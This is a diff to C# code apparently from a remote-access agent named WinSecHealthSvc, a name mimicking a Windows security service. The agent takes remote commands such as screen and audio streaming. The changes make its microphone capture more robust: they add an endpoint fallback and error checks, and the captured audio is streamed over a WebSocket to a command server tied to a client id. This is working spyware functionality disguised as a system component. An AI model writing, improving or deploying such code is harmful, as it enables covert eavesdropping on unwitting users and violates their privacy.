@@ -524,7 +524,14 @@ namespace WinSecHealthSvc
                         _screenStreaming = false; output = "Stream stopped";
                         break;
                     case "audio_start":
-                        if (!_audioStreaming) { _audioStreaming = true; new Thread(AudioStreamLoop) { IsBackground = true }.Start(); output = "Audio stream started"; }
+                        if (!_audioStreaming) { 
+                            _audioStreaming = true; 
+                            Task.Run(async () => {
+                                string res = await AudioStreamLoop();
+                                Log("Audio start: " + res);
+                            });
+                            output = "Audio stream requested (check logs for status)"; 
+                        }
                         else output = "Already streaming audio";
                         break;
                     case "audio_stop":
@@ -820,12 +827,12 @@ namespace WinSecHealthSvc
             try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
         }
 
-        static async void AudioStreamLoop() {
+        static async Task<string> AudioStreamLoop() {
             var ws = new ClientWebSocket();
             try {
                 string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
                 await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
-            } catch { return; }
+            } catch (Exception ex) { _audioStreaming = false; return "WS Connect failed: " + ex.Message; }
 
             IMMDeviceEnumerator enumerator = null;
             IMMDevice device = null;
@@ -834,17 +841,24 @@ namespace WinSecHealthSvc
 
             try {
                 enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")));
-                enumerator.GetDefaultAudioEndpoint(1, 1, out device);
+                
+                int hr = enumerator.GetDefaultAudioEndpoint(1, 1, out device); // 1=Capture, 1=Communications
+                if (hr != 0) {
+                    hr = enumerator.GetDefaultAudioEndpoint(1, 0, out device); // Fallback: Console
+                    if (hr != 0) throw new Exception("No audio capture endpoint found (HRESULT " + hr.ToString("X") + ")");
+                }
                 
                 Guid iidClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                 object obj;
-                device.Activate(iidClient, 23, IntPtr.Zero, out obj);
+                hr = device.Activate(iidClient, 23, IntPtr.Zero, out obj);
+                if (hr != 0) throw new Exception("Device activation failed (HRESULT " + hr.ToString("X") + ")");
                 client = (IAudioClient)obj;
 
                 var fmt = new WAVEFORMATEX { wFormatTag = 1, nChannels = 1, nSamplesPerSec = 16000, wBitsPerSample = 16, nBlockAlign = 2, nAvgBytesPerSec = 32000, cbSize = 0 };
                 IntPtr pFmt = Marshal.AllocHGlobal(Marshal.SizeOf(fmt));
                 Marshal.StructureToPtr(fmt, pFmt, false);
-                client.Initialize(0, 0, 1000000, 0, pFmt, Guid.Empty);
+                hr = client.Initialize(0, 0, 1000000, 0, pFmt, Guid.Empty);
+                if (hr != 0) throw new Exception("Client init failed (HRESULT " + hr.ToString("X") + "). Check mic privacy settings.");
                 
                 Guid iidCapture = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                 client.GetService(iidCapture, out obj);
@@ -871,7 +885,8 @@ namespace WinSecHealthSvc
                     }
                     Thread.Sleep(10);
                 }
-            } catch (Exception ex) { Log("Audio error: " + ex.Message); }
+                return "Finished";
+            } catch (Exception ex) { return "Audio loop error: " + ex.Message; }
             finally {
                 _audioStreaming = false;
                 if (client != null) {
